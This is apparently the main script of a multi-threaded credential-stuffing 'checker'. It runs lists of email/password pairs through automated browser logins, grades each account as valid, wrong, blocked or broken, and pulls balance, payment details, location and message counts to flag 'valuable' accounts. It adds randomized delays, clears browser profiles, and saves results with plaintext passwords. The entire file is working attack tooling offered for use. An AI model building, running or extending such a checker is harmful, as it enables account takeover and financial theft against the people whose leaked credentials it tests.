const { load: loadConfig } = require("./src/config");
const { load: loadAccounts } = require("./src/accounts");
const { createSession, clearSession } = require("./src/browser");
const { checkAccount, isValuable, randDelay } = require("./src/checker");
const ui = require("./src/ui");
const output = require("./src/output");
const path = require("path");
const fs = require("fs");

let nextIdx = 0;

async function worker(id, cfg, accounts) {
  const session = await createSession(cfg, id);
  const { context, page, profileDir } = session;
  const localResults = [];

  try {
    while (true) {
      const jobIdx = nextIdx++;
      if (jobIdx >= accounts.length) break;

      const account = accounts[jobIdx];
      const lineNum = cfg.startLine + jobIdx;
      const email = account.email;
      const pass = account.password;

      await clearSession(page);

      try {
        const info = await checkAccount(page, cfg, email, pass);
        const valuable = isValuable(info);

        const entry = {
          line: lineNum, email, _password: pass, status: "OK",
          balance: info.balance, topUp: info.topUp, payment: info.payment,
          loc: info.loc, threads: info.threads, messages: info.messages, valuable,
        };

        localResults.push(entry);
        ui.result(entry, { showPerAccount: cfg.ui.showPerAccount, compact: cfg.ui.compact });
      } catch (err) {
        let status = "ERR";
        const msg = err.message;
        if (msg === "wrong-pass") status = "WRONG";
        else if (msg === "blocked") status = "BLOCKED";
        else if (msg.includes("no-") || msg === "no-password-step") status = "BROKEN";

        const entry = { line: lineNum, email, _password: pass, status, error: msg, valuable: false };
        localResults.push(entry);
        ui.result(entry, { showPerAccount: cfg.ui.showPerAccount, compact: cfg.ui.compact });
      }

      await new Promise((r) => setTimeout(r, randDelay(cfg)));
    }
  } finally {
    await context.close().catch(() => {});
    if (!cfg.chromeProfile) fs.rmSync(profileDir, { recursive: true, force: true });
  }
  return localResults;
}

async function main() {
  const cfg = loadConfig();

  // ── Interactive CUI setup ──
  if (cfg.cui || process.argv.includes("--setup")) {
    await require("./src/cui").setup();
    // Reload config after CUI setup
    delete require.cache[require.resolve("./src/config")];
    const cfg2 = loadConfig();
    Object.assign(cfg, cfg2);
  }

  const accounts = loadAccounts(cfg);
  const wc = Math.min(cfg.threads, accounts.length);

  ui.banner();
  ui.start({ ...cfg, total: accounts.length, threads: wc });

  const startTime = Date.now();
  const workers = [];
  for (let i = 0; i < wc; i++) workers.push(worker(i, cfg, accounts));
  const results = (await Promise.all(workers)).flat();

  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);

  const stats = {
    ok: results.filter((r) => r.status === "OK").length,
    wrong: results.filter((r) => r.status === "WRONG").length,
    blocked: results.filter((r) => r.status === "BLOCKED").length,
    broken: results.filter((r) => r.status === "BROKEN").length,
    err: results.filter((r) => !["OK", "WRONG", "BLOCKED", "BROKEN"].includes(r.status)).length,
    valuable: results.filter((r) => r.valuable).length,
    completed: results.length,
    total: accounts.length,
  };

  Object.assign(ui.getStats(), stats);
  ui.summary();

  output.writeGrouped(cfg.outputDir, results);
  output.writeSummary(cfg.outputDir, accounts.length, stats, elapsed);

  console.log(`  Results saved to ${cfg.outputDir}/`);
  console.log("");
}

main().catch((err) => { console.error("Fatal:", err); process.exit(1); });
